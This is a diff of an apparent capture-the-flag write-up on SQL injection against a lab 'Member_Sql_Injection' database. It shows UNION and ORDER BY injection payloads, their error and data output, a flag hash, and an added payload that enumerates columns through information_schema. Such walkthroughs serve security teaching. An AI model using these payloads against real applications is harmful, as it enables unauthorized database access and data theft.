@@ -108,17 +108,7 @@ Trying different inputs we can get information from the error messages.
 `1 union select 1,2,3 from user -- -`
 >Table 'Member_Sql_Injection.user' doesn't exist
 
-The table is called Member_Sql_Injection
-
-Trying 
-`1 or 1=1 ORDER BY 1--`, 
-
-`1 or 1=1 ORDER BY 2--` and 
-
-`1 or 1=1 ORDER BY 3--` 
->Unknown column '3' in 'order clause'
-
-There are only 2 columns, first name and last name. 
+The database is called Member_Sql_Injection
 
 `1 or 1=1 UNION SELECT version(),user()--`
 >First name: 5.5.44-0ubuntu0.12.04.1
@@ -151,3 +141,4 @@ Sha256 on fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6
 Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 ---
+1 or 1=1 UNION SELECT NULL,group_concat(column_name, 0x0a) FROM information_schema.columns where table_name = 0x64625f64656661756c74
